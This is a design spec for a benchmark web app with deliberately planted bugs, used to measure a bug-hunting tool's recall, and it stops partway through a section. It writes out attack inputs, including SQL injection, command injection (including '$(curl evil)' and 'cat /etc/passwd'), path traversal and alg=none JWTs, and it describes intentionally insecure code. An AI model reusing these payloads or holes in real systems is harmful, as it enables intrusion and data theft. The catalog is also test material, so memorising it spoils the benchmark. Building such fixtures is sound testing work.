# SPEC — v0.54 "Comprehensive benchmark fixture (BugHunter-bench `comprehensive-bench`)"

**Status:** Draft 1 — ready for `@coder` assignment
**Author:** `@architect` (Opus, ultrathink)
**Date:** 2026-05-02
**Issue:** cunninghambe/BugHunter-bench (new app: `comprehensive-bench`)
**Sibling specs (firm orthogonality):** v0.51 cross-browser (firefox/webkit specifics — out), v0.52 visual regression (vision baseline corpus — out), v0.53 multi-surface consumer (BugHunter-internal — orthogonal: `comprehensive-bench` IS a multi-surface app and exercises v0.53 by construction).
**Where the fixture lives:** `BugHunter-bench/apps/comprehensive-bench/` (the 6th bench app alongside `vibe-todo`, `vite-shop`, `vue-board`, `next-blog`, `astro-saas`).
**What it replaces:** `BugHunter/fixtures/bughunter-self-deliberate-bugs/` as the **canonical recall benchmark**. The old fixture stays on disk for v33 self-test back-compat and for kinds the new fixture cannot host (`prompt_injection_executed` plant remains in `pen-bad`).

---

## 1. Problem statement

BugHunter's current canonical recall fixture is `bughunter-self-deliberate-bugs`. It is a coordinator that boots six sub-fixtures (`race-bad`, `idor-bad`, `v24-deferred-bugs`, `pen-bad`, `a11y-bad`, `seo-bad`) plus a small home-grown SPA + API for the leftover kinds. The score against it floats at ~12.4% recall (smoke #9, post-v53 multi-surface). That number reads like a quality ceiling; it is not. It is a **coverage** ceiling: most wired kinds have exactly one plant, several have zero, and several plants live in surfaces that the runner never reaches because the surface-graph isn't crawled deeply enough. A single missing plant moves a kind from "detector silently broken" to "fixture silently empty" — and we cannot tell the two apart from the recall number. The fix is not another detector; it is a fixture where every wired BugKind has 2–3 deliberate plants of known shape, in one composite app whose API + UI + auth + data behave like a real product. Then recall becomes what we said it should be: the fraction of planted bugs the system actually finds.

---

## 2. Goals / non-goals

### 2.1 In scope

- **Per-kind coverage floor.** Every `status === 'wired'` entry in `packages/cli/src/detectors/registry.ts` (currently ~95 kinds, see § 4 for the snapshot) gets **2–3 deliberate plants** of distinct shape in `comprehensive-bench`. "Distinct shape" means the plants are observably different to a human reader — not the same bug copy-pasted to a second route.
- **One composite app.** All plants live in **one** app — `comprehensive-bench` — with one frontend (Vite + React) and one backend (Express + OpenAPI document), exercised through SurfaceMCP's existing `vite` and `openapi` extractors. Multiple "surfaces" in the SurfaceMCP sense; one app in the user-product sense.
- **Real domain shape.** A project-management product (boards, tasks, comments, users, billing). Plants must be embedded in routes that **could plausibly exist** in a real PM tool. No `/console-error` or `/xss-dom` debug routes whose only purpose is to fire a detector.
- **`gold-standard.jsonl` mirrors the existing bench-app shape.** One JSONL line per planted bug (not per kind), goldId-prefixed `comprehensive-bench-NNN`, with `kind`, `expected: "detector_fires"`, `structuralMatch`, `rationale`, `humanRepro`. Calibration tooling (`scripts/validate-manifest.mjs`) Just Works.
- **End-to-end runnable.** `npm run boot comprehensive-bench` starts everything; `npm run teardown` graceful exit; healthcheck at `/healthz`; all in under 30 minutes wall-clock end-to-end including BugHunter's run.
- **3-role auth.** `anonymous`, `member`, `admin`. IDOR detectors require peer-tier; auth-bypass requires unauth-vs-authed. Plus a 4th synthetic user `member-other` so horizontal IDOR has a victim that isn't the actor.
- **Replaces the canonical benchmark.** v33 `bughunter self-test` switches its primary target to `comprehensive-bench`. The old fixture stays as a regression gate for `prompt_injection_executed` (LLM-stub plant) and for any kind we deliberately leave hosted there.

### 2.2 Out of scope (firm)

- **Cross-browser specifics** — chromium-only fixture; webkit/firefox plants live in v0.51's territory.
- **Visual regression baseline corpus** — `visual_anomaly` gets 2 plants here (a planted layout glitch), but the v0.52 baseline-image corpus is its own thing.
- **Real-world simulation** — that's Aspectv3. This fixture is for measurement, not chaos.
- **Deferred kinds.** `xss_stored`, `infinite_loading`, the V38 interaction-palette kinds, the V41 mobile kinds marked `deferred`, the V43 agentic kinds marked `deferred`, `permission_denied_unhandled`, `idempotency_key_violation`. These are explicitly listed in § 4.10 and produce **zero** gold lines. When their detectors are wired, V54.10+ adds plants.
- **New SurfaceMCP stack types** — `vite` + `openapi` only. No Astro, no Next, no Vue. (Cross-stack coverage is the whole point of having 5 other bench apps.)
- **New detector dependencies** — fixture only. No new npm packages in BugHunter itself.
- **Kind elimination.** If a kind is `wired` in registry but plants reveal it doesn't actually fire, that's a BugHunter bug — file it; do **not** drop the gold entry.

---

## 3. Architecture: app structure

### 3.1 Domain

A project-management product. Concretely, a stripped-down Linear/Trello hybrid:

- **Workspaces** (one tenant per workspace).
- **Boards** within a workspace (kanban-style).
- **Tasks** on boards (title, body markdown, assignee, due date, priority, labels, status, attachment).
- **Comments** on tasks (markdown, edit/delete).
- **Users** with roles inside a workspace: `admin`, `member`. Anonymous users see only the marketing landing page + login + signup + a public read-only board for marketing demos.
- **Billing** (mock Stripe-style endpoints — for `money_math_precision`, `audit_log_missing_for_mutation`).
- **Search** (full-text across tasks/comments — for SQL injection, XSS reflected).
- **File attachments** (uploads → served via a route — for `path_traversal`).
- **Admin tools** (export reports, run health probes — for `command_injection`, `idor_vertical_*`).
- **Notifications inbox** (read/unread — for `multi_user_inconsistent_snapshot`, `cache_staleness`).

Why this domain: it has natural genre-fit homes for every wired kind. CRUD APIs (IDOR), free-text fields (XSS / SQLi), uploads (path traversal), admin (vertical IDOR + command injection), money (precision), notifications (cache + multi-context), large lists (perf), forms (a11y + nav-state), markdown rendering (XSS DOM), webhooks (CSRF, open redirect), passwords (auth flows). Anything we can't map naturally either belongs in a more specialised fixture or is a deferred kind.

### 3.2 Stacks

- **Frontend:** Vite 6 + React 18 + react-router-dom 6 + zustand. **Identical** to `vite-shop` in the bench so contributors can copy patterns. Stack id `vite` for SurfaceMCP. Port **4106**.
- **Backend:** Express 4 with an OpenAPI 3.0 document at `GET /openapi.json`. SurfaceMCP `openapi` extractor consumes it. Port **4156** (frontend port + 50, mirroring vite-shop's local convention).
- **Persistence:** in-memory store seeded from `seed.json`. **No real DB.** SQLi plants use a real `better-sqlite3` mounted at `/api/search` only (one of the SQLi plant sites needs a real query engine; the rest of the API uses the in-memory store). `better-sqlite3` is already a dev-deps in another bench app and is allowed.
- **Auth:** JWT (HS256) in `httpOnly` cookie on success path; **two deliberate plants** intentionally use weak/none algorithm or non-`httpOnly` cookies (see § 4.1).
- **Two surfaces, one app:** `comprehensive-bench-web` (vite, port 4106) and `comprehensive-bench-api` (openapi, port 4156). One `surfacemcp.config.json` lists both.

### 3.3 Roles and seed users

```json
{
  "users": [
    { "id": "u-admin",  "email": "admin@bench.local",      "password": "AdminBench123!", "role": "admin",  "workspaceId": "w1" },
    { "id": "u-mem-1",  "email": "member1@bench.local",    "password": "MemberBench1!",  "role": "member", "workspaceId": "w1" },
    { "id": "u-mem-2",  "email": "member2@bench.local",    "password": "MemberBench2!",  "role": "member", "workspaceId": "w1" },
    { "id": "u-other",  "email": "outsider@bench.local",   "password": "OutsiderBench!", "role": "member", "workspaceId": "w2" }
  ]
}
```

`u-mem-2` exists so `u-mem-1`'s actions have a peer victim for horizontal IDOR (`u-mem-1` reads/mutates `u-mem-2`'s task, both inside `w1`). `u-other` exists for cross-tenant escapes.

`bughunter.config.json#auth.credentials` enumerates all four; SurfaceMCP roles enumerate `anonymous`, `member` (uses `u-mem-1`), `member-other` (uses `u-mem-2`), `admin`. Cross-tenant `u-other` is reached only via direct probing for one specific gold entry (cross-workspace IDOR).

### 3.4 Routes (UI) — 22 pages

All routes are real product routes. Plants are **embedded** in real flows; no `/dummy-bug` routes.

| # | Path | Auth | Purpose | Hosts plants for kinds |
|---|------|------|---------|------------------------|
|  1 | `/` | anon | Marketing landing | `seo_*`, `oversized_bundle` |
|  2 | `/pricing` | anon | Pricing | `seo_title_duplicate_across_routes` (twin of `/`) |
|  3 | `/login` | anon | Login form | `auth_session_fixation`, `no_rate_limit_on_login`, `cookie_security_flags`, `form_input_unlabeled` |
|  4 | `/signup` | anon | Signup | `xss_reflected` (error-echoes email), `nav_form_state_lost` |
|  5 | `/reset` | anon | Password reset | `password_reset_token_reuse`, `nav_resubmit_on_back` |
|  6 | `/oauth/callback` | anon | OAuth shim | `open_redirect`, `sensitive_data_in_url` |
|  7 | `/dashboard` | member | Workspace dashboard | `slow_lcp`, `n_plus_one_api_calls`, `request_dedup_missing` |
|  8 | `/boards` | member | Board list | `unbounded_list_render`, `image_missing_alt` |
|  9 | `/boards/:id` | member | Kanban view | `excessive_re_renders`, `race_condition_optimistic_revert`, `keyboard_trap`, `accessibility_critical`, `interactive_element_missing_accessible_name`, `nav_state_corruption` |
| 10 | `/boards/:id/task/:taskId` | member | Task detail | `xss_dom` (markdown body), `idor_horizontal_read`, `request_cancellation_missing`, `focus_lost_after_action`, `axe_color_contrast_strong`, `touch_target_too_small` |
| 11 | `/boards/:id/task/:taskId/edit` | member | Edit task | `nav_form_state_stale`, `nav_refresh_double_mutation`, `i18n_pluralization_broken` |
| 12 | `/boards/:id/new` | member | New task | `race_condition_double_submit`, `race_condition_click_navigate`, `csrf_missing_on_mutating_route`, `network_fault_unhandled` |
| 13 | `/inbox` | member | Notifications | `cache_staleness`, `multi_user_inconsistent_snapshot`, `visibility_change_state_loss` |
| 14 | `/search` | member | Search | `xss_reflected`, `sql_injection`, `slow_inp` |
| 15 | `/profile` | member | Profile | `i18n_timezone_display_wrong`, `high_cls`, `i18n_currency_format_broken` |
| 16 | `/billing` | member | Subscription | `money_math_precision`, `i18n_date_format_ambiguous` |
| 17 | `/widgets/embed` | anon | Embed iframe demo | `iframe_postmessage_unguarded`, `subresource_integrity_violation`, `coop_coep_violation`, `trusted_types_violation` |
| 18 | `/admin/users` | admin | User admin | `idor_vertical_role_escalate`, `idor_vertical_suspicious`, `audit_log_missing_for_mutation` |
| 19 | `/admin/reports` | admin | Reports + health probe | `command_injection`, `auth_bypass_via_unauthed_route`, `stack_trace_leak_in_response` |
| 20 | `/admin/files` | admin | File browser | `path_traversal`, `soft_delete_consistency` |
| 21 | `/realtime` | member | Realtime collab demo | `web_worker_error`, `webrtc_ice_failure`, `service_worker_stale`, `race_condition_cross_tab`, `race_condition_interleaved_mutations`, `multi_context_state_divergence` |
| 22 | `/help/:slug` | member | Markdown help | `404_for_linked_route`, `hallucinated_route`, `seo_robots_blocking_crawl`, `i18n_rtl_layout_break`, `i18n_long_string_overflow`, `shadow_dom_a11y_violation`, `nav_form_state_lost` |

Total real product routes: 22. Routes purely for hosting plants: 0. Static analysis files (`hardcoded_credentials_in_source`, `swallowed_error_empty_catch`, `i18n_hardcoded_string`, `hover_only_affordance`, `vulnerable_dependency_high`) live in real source files (`src/lib/auth.ts`, `src/lib/billing-utils.ts`, `package.json`) without dedicated routes.

### 3.5 API endpoints — ~30 routes

The OpenAPI doc at `/openapi.json` enumerates every endpoint with a role array. SurfaceMCP `openapi` extractor reads it. Selected endpoints (full list in § 4 and the implementation):

```
POST  /api/auth/login        roles: anonymous
POST  /api/auth/signup       roles: anonymous
POST  /api/auth/logout       roles: member, admin
POST  /api/auth/reset        roles: anonymous
GET   /api/me                roles: member, admin
GET   /api/boards            roles: member, admin
POST  /api/boards            roles: member, admin
GET   /api/boards/{id}       roles: member, admin
DELETE /api/boards/{id}      roles: admin
GET   /api/tasks/{id}        roles: member, admin     ← idor_horizontal_read plant
PATCH /api/tasks/{id}        roles: member, admin     ← idor_horizontal_mutate plant
POST  /api/tasks             roles: member, admin
DELETE /api/tasks/{id}       roles: member, admin
GET   /api/tasks/{id}/comments  roles: member, admin
POST  /api/tasks/{id}/comments  roles: member, admin  ← race_condition_double_submit plant
GET   /api/search?q=         roles: member, admin     ← sql_injection, xss_reflected plant
GET   /api/files/{path}      roles: member, admin     ← path_traversal plant
POST  /api/files             roles: member, admin
GET   /api/notifications     roles: member, admin     ← cache_staleness plant
POST  /api/billing/charge    roles: member, admin     ← money_math_precision plant
GET   /api/admin/users       roles: admin             ← idor_vertical_suspicious plant (forgets gate)
PATCH /api/admin/users/{id}  roles: admin             ← idor_vertical_role_escalate plant
GET   /api/admin/reports     roles: admin             ← auth_bypass plant (forgets gate)
POST  /api/admin/health      roles: admin             ← command_injection plant
POST  /api/webhooks/oauth    roles: anonymous         ← csrf_missing plant, open_redirect plant
GET   /api/teapot            roles: anonymous         ← network_4xx_unexpected plant
GET   /api/boom              roles: anonymous         ← network_5xx plant
GET   /api/throw             roles: anonymous         ← stack_trace_leak plant
GET   /headers/no-csp        roles: anonymous         ← missing_csp_header plant
GET   /headers/wide-cors     roles: anonymous         ← permissive_cors plant
```

Some endpoints host more than one plant: `POST /api/auth/login` hosts both `no_rate_limit_on_login` AND `auth_session_fixation` AND `cookie_security_flags`, because all three are different defects of the same login flow.

---

## 4. Per-kind plant catalog

This is the **load-bearing** section. Each plant entry is implementable independently. Format:

```
KIND_NAME                    [#plants] (severity)
  P1: file → effect → detector signal
  P2: file → effect → detector signal
  (P3 if applicable)
  Required infra: <only if non-default>
```

The "detector signal" reflects what the wired detector at `<detectorSite>` actually checks — pulled from the registry. Coders implementing plants must read the detector source first; the signal here is a contract, not a hint.

### 4.0 Counts summary (wired-only)

| Category | Wired kinds | Plants planned |
|---|---|---|
| § 4.1 Security: auth + headers + leaks | 14 | 30 |
| § 4.2 Security: injection + XSS | 7 | 17 |
| § 4.3 Security: IDOR + cross-user | 6 | 14 |
| § 4.4 Performance | 11 | 25 |
| § 4.5 Accessibility (incl. mobile a11y) | 8 | 18 |
| § 4.6 SEO + meta | 6 | 13 |
| § 4.7 Structural / nav-state / hallucinated | 8 | 18 |
| § 4.8 Browser platform (workers, iframes, SRI, COOP) | 8 | 17 |
| § 4.9 Race + multi-context + network faults | 10 | 23 |
| § 4.10 Data integrity + clock + i18n | 17 | 38 |
| § 4.11 Core (console / react / hydration / network 4xx/5xx / 404 / state-change / surface-call / unhandled / dom-error / visual / a11y-critical) | 12 | 27 |
| § 4.12 Agentic (single wired kind) | 1 | 2 (kept in `pen-bad` reuse) |
| **Total** | **~95** | **~232 plants** |

Plant count averages ~2.4 per kind, matching the 2–3 floor.

### 4.1 Security: auth + headers + leaks (14 wired kinds, 30 plants)

```
missing_csp_header                                    [3] (major)
  P1: server.js → /headers/no-csp endpoint → response has no Content-Security-Policy header
  P2: server.js → /api/teapot → no CSP, content-type text/html
  P3: server.js → / (marketing) → CSP set but `default-src *` (still a violation per detector)

permissive_cors                                       [2] (major)
  P1: server.js → /headers/wide-cors → Access-Control-Allow-Origin: *, credentials: true
  P2: server.js → /api/me → ACAO reflects request Origin without check

cookie_security_flags                                 [3] (major)
  P1: /api/auth/login sets `session=...` with no Secure, no HttpOnly
  P2: /api/auth/login sets `csrf-token=...` with no SameSite
  P3: /api/admin/users PATCH issues a tracking cookie missing all three

open_redirect                                         [2] (major)
  P1: /oauth/callback?next=<url> → 302 to `next` without origin allowlist
  P2: /api/webhooks/oauth?return_to=<url> → 302 unfiltered

sensitive_data_in_url                                 [2] (major)
  P1: /oauth/callback receives `?token=<JWT>` in query
  P2: /api/billing/charge accepts `?cardLast4=...&exp=...` in GET (deliberately wrong; should be POST body)

stack_trace_leak_in_response                          [2] (major)
  P1: /api/throw → throws inside handler, no error middleware → Express default leaks stack
  P2: /api/admin/health on bad payload → catch block returns `JSON.stringify(err)`

vulnerable_dependency_high                            [2] (critical)
  P1: package.json includes `lodash@4.17.20` (CVE-2021-23337)
  P2: package.json includes `axios@0.21.0` (CVE-2021-3749)
  Detector: npm-audit static tool; dev-dependency placement is OK

hardcoded_credentials_in_source                       [3] (critical)
  P1: src/lib/auth.ts → const STRIPE_KEY = "<stripe test-key from gitleaks fixtures>"
  P2: src/lib/auth.ts → const AWS_ACCESS_KEY = "<aws example key from gitleaks fixtures>"
  P3: server/seed.ts → const SLACK_BOT_TOKEN = "<slack bot token placeholder>"
  Detector: gitleaks. Use the canonical gitleaks-fixture token strings
  in the actual fixture source — DO NOT inline real keys here. The
  literal token strings live in the fixture file, not in this spec
  (avoids triggering GitHub push-protection on the spec PR).

swallowed_error_empty_catch                           [3] (minor)
  P1: src/lib/auth.ts → `try { parseToken() } catch (e) {}`
  P2: src/components/TaskCard.tsx → empty catch around `await loadComments`
  P3: server/handlers/files.ts → empty catch around `fs.readFileSync`
  Detector: eslint no-empty-catch (static)

idor_horizontal                                       [legacy alias — see § 4.3]
idor_horizontal_read, idor_horizontal_mutate, idor_vertical_suspicious,
idor_vertical_role_escalate, auth_bypass_via_unauthed_route, no_rate_limit_on_login
                                                      [see § 4.3]

csrf_missing_on_mutating_route                        [3] (major)
  P1: POST /api/webhooks/oauth no SameSite cookie + no CSRF token
  P2: POST /api/billing/charge no CSRF token
  P3: PATCH /api/tasks/{id} no CSRF token (shows up in production runs)

auth_session_fixation                                 [2] (critical)
  P1: /api/auth/login does NOT rotate session cookie on success
  P2: /api/auth/login accepts a pre-set `session=` cookie from request
  Detector: phases/auth-flow.ts:135 — same cookie pre/post auth.

password_reset_token_reuse                            [2] (major)
  P1: /api/auth/reset accepts the same token twice (no single-use enforcement)
  P2: /api/auth/reset accepts the token after expiry (no exp check)

jwt_weak_alg                                          [2] (major)
  P1: /api/auth/login on header `?alg=none` flag accepts unsigned JWT
  P2: /api/auth/login signs with HS256 + key "secret" (low-entropy, found by detector)
  Detector: pen-detectors.ts:284 — synthetic probe.
```

### 4.2 Security: injection + XSS (7 wired kinds, 17 plants)

```
sql_injection                                         [3] (critical)
  P1: GET /api/search?q=' OR '1'='1 → all rows returned (string concat)
  P2: GET /api/admin/reports?filter= builds SQL via template literal
  P3: GET /api/tasks?label= concats label into SQL fragment
  Required infra: better-sqlite3 file at server/data/search.sqlite, seeded

command_injection                                     [2] (critical)
  P1: POST /api/admin/health body { target: "8.8.8.8; cat /etc/passwd" } → child_process.exec(`ping ${target}`)
  P2: POST /api/admin/health body { domain: "$(curl evil)" } → exec same path

path_traversal                                        [3] (critical)
  P1: GET /api/files/../../../etc/passwd → fs.readFile(path.join(uploadsDir, req.params.path))
  P2: GET /api/files/{path} also accepts `..%2f..%2fetc%2fpasswd`
  P3: GET /admin/files page fetches via the same endpoint — ensures UI walk reaches it

xss_reflected                                         [3] (critical)
  P1: GET /api/search renders `<p>You searched for: ${q}</p>` server-side HTML
  P2: /signup error response inlines `<div class="error">${email} not allowed</div>`
  P3: /api/echo (debug endpoint kept for back-compat) reflects body unchanged

xss_dom                                               [2] (critical)
  P1: TaskBody.tsx → dangerouslySetInnerHTML={{__html: task.bodyMarkdown}} (no DOMPurify)
  P2: HelpPage.tsx → element.innerHTML = await fetchHelp(slug)

prompt_injection_executed                             [reuse pen-bad fixture for now]
  Note: BugHunter-bench has no LLM stub; the v0.43 prompt-injection
  runner targets `pen-bad`. This kind keeps its existing plant in
  pen-bad and is referenced from MANIFEST.json's pen-bad app entry.
  (No plant in comprehensive-bench.)
```

### 4.3 Security: IDOR + cross-user + unauth + rate-limit (6 wired kinds, 14 plants)

```
idor_horizontal_read                                  [3] (critical)
  P1: GET /api/tasks/{id} returns task without checking req.user.workspaceId === task.workspaceId
  P2: GET /api/boards/{id} returns board without ownership check
  P3: GET /api/tasks/{id}/comments returns comments regardless of viewer

idor_horizontal_mutate                                [3] (critical)
  P1: PATCH /api/tasks/{id} accepts edits from any authenticated user
  P2: DELETE /api/tasks/{id} same
  P3: POST /api/tasks/{id}/comments allows commenting on any task in any workspace

idor_vertical_suspicious                              [2] (major)
  P1: GET /api/admin/users → forgets `requireRole('admin')`, member receives 200
  P2: GET /api/admin/reports same omission

idor_vertical_role_escalate                           [2] (critical)
  P1: PATCH /api/admin/users/{id} accepts {role: "admin"} from member (no role gate)
  P2: POST /api/auth/promote (legacy) accepts self-promotion

auth_bypass_via_unauthed_route                        [2] (critical)
  P1: GET /api/admin/reports (route definition has no requireAuth middleware)
  P2: POST /api/billing/charge processable while logged out (charges anonymous user as `null`)

no_rate_limit_on_login                                [2] (major)
  P1: POST /api/auth/login has no per-IP throttle (auth-probes.ts hits 100×)
  P2: POST /api/auth/reset has no rate limit either
```

`idor_horizontal` (legacy alias, defaultSeverity major) is kept by reusing the same plant as `idor_horizontal_read` plus `idor_horizontal_mutate` — gold entries reference the same routes for both; the registry distinguishes them. **Do not** plant separately for `idor_horizontal`.

### 4.4 Performance (11 wired kinds, 25 plants)

```
slow_lcp                                              [2] (major)
  P1: /dashboard renders inside React.lazy with intentional 2500ms artificial delay before LCP element
  P2: / (marketing) hero image is 8 MB unoptimized JPEG, no preload

slow_inp                                              [2] (major)
  P1: /search input handler runs synchronous fuzzy-match over 50k items per keystroke
  P2: /boards/:id click handler on each card runs heavy JSON.parse round-trip

high_cls                                              [2] (major)
  P1: /profile renders avatars without width/height — late image load shifts content
  P2: / hero ad slot injected after 1500ms shifts everything below

unbounded_list_render                                 [2] (major)
  P1: /boards renders all 5,000 seed tasks unvirtualised in one .map()
  P2: /search renders all 10,000 search results without windowing

n_plus_one_api_calls                                  [2] (major)
  P1: /dashboard fetches /api/boards then maps each to /api/boards/{id}/stats (N+1 inside `Promise.all`)
  P2: /inbox fetches notifications then per-notification /api/users/{id} for the actor avatar

request_dedup_missing                                 [2] (minor)
  P1: /dashboard mounts <Header/> and <Sidebar/> both fetching /api/me independently
  P2: /boards/:id mounts board + breadcrumb both fetching /api/boards/{id}

request_cancellation_missing                          [2] (minor)
  P1: /search input fires fetch on each keystroke without AbortController
  P2: /boards/:id/task/:taskId pre-fetch on hover not cancelled on unhover

main_thread_blocked                                   [2] (major)
  P1: /search fuzzy-match loop runs synchronously for ~600ms (longTask threshold)
  P2: /admin/reports CSV generator runs sync over 100k rows on click

oversized_bundle                                      [2] (major)
  P1: import * as moment from 'moment' on the marketing page (full bundle ~290KB)
  P2: import lodash entirely (not lodash-es subpaths) on /dashboard

excessive_re_renders                                  [2] (minor)
  P1: /boards/:id parent passes new {} object every render → memoised child re-renders
  P2: /profile useEffect with no deps re-runs every render

memory_leak_suspected                                 [2] (major)
  P1: /realtime opens WebSocket-style EventSource and never closes on unmount
  P2: /inbox subscribes to setInterval polling without clearInterval on unmount

memory_leak_attributed                                [2] (major)
  P1: same EventSource leak on /realtime → attribution to `useRealtime` hook
  P2: same setInterval leak on /inbox → attribution to `useInboxPoll` hook
  Detector: phases/analyze.ts:93 attributes by stack frame; both plant locations have stable hook names.
```

### 4.5 Accessibility (8 wired kinds, 18 plants)

```
accessibility_critical                                [2] (critical)
  P1: /boards/:id has multiple <h1> + nested invalid <button><button> structure → axe critical
  P2: /admin/users uses <div onclick> with no role/tabindex on every row

axe_color_contrast_strong                             [2] (major)
  P1: /boards/:id/task/:taskId chip labels use #aaaaaa on #ffffff (1.6:1 ratio)
  P2: /search "no results" placeholder is #cccccc on #ffffff

keyboard_trap                                         [2] (major)
  P1: /boards/:id task-detail modal traps Tab forever (no focus return path)
  P2: /admin/files file-preview modal same

focus_lost_after_action                               [2] (minor)
  P1: /boards/:id/task/:taskId Save button blurs to body, no focus restore
  P2: /admin/users role-toggle action drops focus

image_missing_alt                                     [2] (minor)
  P1: /boards renders board cover <img> without alt
  P2: / marketing avatar grid has six <img> without alt

form_input_unlabeled                                  [2] (minor)
  P1: /login email input is <input type="email"> with placeholder only, no <label>
  P2: /profile timezone <select> has no <label>

interactive_element_missing_accessible_name          [2] (minor)
  P1: /boards/:id task-card has icon-only <button> with no aria-label
  P2: /inbox mark-read action is <a> with empty content

touch_target_too_small                                [2] (minor)
  P1: /boards/:id/task/:taskId quick-action icons are 24×24
  P2: /search filter chips are 28×28

hover_only_affordance                                 [2] (minor)
  P1: src/components/TaskCard.tsx CSS — `.menu { display: none }`, `.card:hover .menu { display: block }` (no focus-within)
  P2: src/components/Tooltip.tsx same pattern
  Detector: static analyser hover-only-affordance.ts; pure CSS detection.
```

### 4.6 SEO + meta (6 wired kinds, 13 plants)

```
seo_title_missing                                     [2] (minor)
  P1: /signup has empty <title>
  P2: /reset has no <title> tag at all

seo_title_duplicate_across_routes                     [3] (minor)
  P1: / and /pricing both have title="Project Bench"
  P2: /boards and /boards/:id both have title="Boards"
  P3: /help/:slug pages all share title="Help"

seo_meta_description_missing                          [2] (minor)
  P1: / lacks <meta name="description">
  P2: /pricing same

seo_canonical_missing                                 [2] (minor)
  P1: / no <link rel="canonical">
  P2: /pricing same

seo_h1_missing_or_multiple                            [2] (minor)
  P1: /admin/reports has zero <h1>
  P2: /boards/:id has three <h1>

seo_robots_blocking_crawl                             [2] (minor)
  P1: /help/:slug emits <meta name="robots" content="noindex,nofollow">
  P2: server returns X-Robots-Tag: noindex on /pricing
```

### 4.7 Structural / nav-state / hallucinated (8 wired kinds, 18 plants)

```
nav_state_corruption                                  [3] (major)
  P1: /boards/:id status filter stored in URL query but `popstate` doesn't sync zustand
  P2: /search query in URL but reset to "" on back-button
  P3: /inbox tab state corrupts on history.back

nav_resubmit_on_back                                  [2] (major)
  P1: /reset POST → 302; back-button re-fires the POST
  P2: /signup similar

nav_refresh_double_mutation                           [2] (major)
  P1: /boards/:id/task/:taskId/edit Save → POST → page refresh re-POSTs
  P2: /billing charge confirmation page refresh re-charges

nav_form_state_lost                                   [2] (minor)
  P1: /signup half-filled form lost on back/forward
  P2: /help/:slug feedback form lost on hash navigation

nav_form_state_stale                                  [2] (minor)
  P1: /boards/:id/task/:taskId/edit shows previous task's body on quick navigation
  P2: /profile shows previous user's settings if you switch accounts via back-button

hallucinated_route                                    [2] (major)
  P1: /help/:slug body links to /docs/api which 404s
  P2: /dashboard sidebar has link to /reports which is /admin/reports (visible to members → 401)

404_for_linked_route                                  [2] (major)
  P1: /help/:slug links to /help/missing-page (genuine 404)
  P2: footer link to /careers (route doesn't exist)

dom_error_text                                        [2] (major)
  P1: /search renders "Error: cannot read property of undefined" on empty input
  P2: /boards/:id renders "TypeError: ..." in toast for failed task moves
```

### 4.8 Browser platform — workers/iframes/SRI/COOP (8 wired kinds, 17 plants)

All hosted on `/widgets/embed` and `/realtime` (the two routes that have a legitimate need for these features in a real PM tool).

```
service_worker_stale                                  [2] (minor)
  P1: /widgets/embed registers SW that doesn't call skipWaiting()
  P2: /realtime registers a second SW that ignores `controllerchange`

web_worker_error                                      [2] (major)
  P1: /realtime spawns Worker that throws on first message
  P2: /search filtering Worker throws on certain payload sizes

iframe_postmessage_unguarded                          [2] (major)
  P1: /widgets/embed listens for postMessage with no `event.origin` check
  P2: /realtime same pattern for collab iframe

shadow_dom_a11y_violation                             [2] (major)
  P1: /help/:slug component <help-card> shadow root has 1.6:1 contrast
  P2: /boards/:id custom <task-chip> shadow root same

webrtc_ice_failure                                    [2] (major)
  P1: /realtime configures RTCPeerConnection with stun://invalid-host:9999
  P2: /realtime second PC has no failure handler

subresource_integrity_violation                       [2] (major)
  P1: /widgets/embed loads <script src="https://cdn.example/lib.js"> without integrity=
  P2: / loads <link rel="stylesheet" cross-origin> without integrity=

coop_coep_violation                                   [2] (major)
  P1: /widgets/embed uses `new SharedArrayBuffer(1024)` without COOP/COEP
  P2: /realtime same usage

trusted_types_violation                               [3] (major)
  P1: /help/:slug element.innerHTML = userMarkdown (CSP enforces require-trusted-types-for 'script' on this route)
  P2: /search history.replaceState with reflected query
  P3: /admin/reports document.write of CSV preview
  Required infra: meta CSP `require-trusted-types-for 'script'` on these routes only
```

### 4.9 Race + multi-context + network faults (10 wired kinds, 23 plants)

```
race_condition_double_submit                          [3] (major)
  P1: /boards/:id/new — Place button is not disabled while POST in flight
  P2: /boards/:id/task/:taskId/edit — Save button same
  P3: /billing charge confirm same

race_condition_click_navigate                         [2] (major)
  P1: /boards/:id "add task" button → POST then router.push, no await
  P2: /admin/users role-change → PATCH then navigate

race_condition_optimistic_revert                      [3] (major)
  P1: /boards/:id drag-and-drop card move — optimistic UI never reverts on 500
  P2: /inbox mark-read optimistic toggle never reverts on 500
  P3: /boards/:id task delete optimistic remove never reverts on 500

race_condition_interleaved_mutations                  [2] (major)
  P1: /admin/users role updates from two tabs interleave (last-writer-wins-wrong)
  P2: /realtime task-edit from two tabs

race_condition_cross_tab                              [2] (major)
  P1: /realtime cart/inbox state not synced across tabs via BroadcastChannel
  P2: /boards/:id task list not synced across tabs

multi_context_state_divergence                        [2] (major)
  P1: /realtime member view diverges from admin view after admin role change
  P2: /inbox state diverges between two tabs after one marks notifications read

multi_user_inconsistent_snapshot                      [2] (major)
  P1: /boards/:id concurrent comment posts produce different visible sets per user
  P2: /admin/users add-user causes inconsistent member list snapshot

visibility_change_state_loss                          [2] (minor)
  P1: /search results lost on tab-blur + tab-focus
  P2: /inbox unread badge resets on visibility change

network_fault_unhandled                               [3] (major)
  P1: /boards/:id task move — fetch rejects, UI shows infinite loading
  P2: /signup form submission — fetch reject, no error toast
  P3: /search query fails, results blank, no message

network_fault_optimistic_no_revert                    [2] (major)
  P1: /boards/:id drag-drop optimistic + 500 → no revert
  P2: /inbox mark-read optimistic + 500 → no revert
  Note: same UI sites as race_condition_optimistic_revert P2 + P3 but different
  detector trigger (network-fault runner injects 500). Gold entries are distinct.
```

### 4.10 Data integrity + clock + i18n (17 wired kinds, 38 plants)

```
data_integrity_orphan                                 [2] (major)
  P1: DELETE /api/boards/{id} leaves orphan tasks (no cascade)
  P2: DELETE /api/tasks/{id} leaves orphan comments (no cascade)

money_math_precision                                  [2] (critical)
  P1: /api/billing/charge uses (price * quantity) with floats (0.1+0.2 case)
  P2: /api/billing/credit-discount accumulates discounts as floats

cache_staleness                                       [2] (minor)
  P1: /inbox unread count cached; new notification doesn't invalidate
  P2: /boards count cached; create/delete board doesn't bust cache

audit_log_missing_for_mutation                        [2] (major)
  P1: PATCH /api/admin/users/{id} role change writes no audit row
  P2: DELETE /api/tasks/{id} writes no audit row

soft_delete_consistency                               [2] (major)
  P1: GET /api/tasks returns tasks where deletedAt IS NOT NULL (read query forgets the filter)
  P2: GET /api/boards same forgets deletedAt filter

clock_skew_token_invalid                              [2] (major)
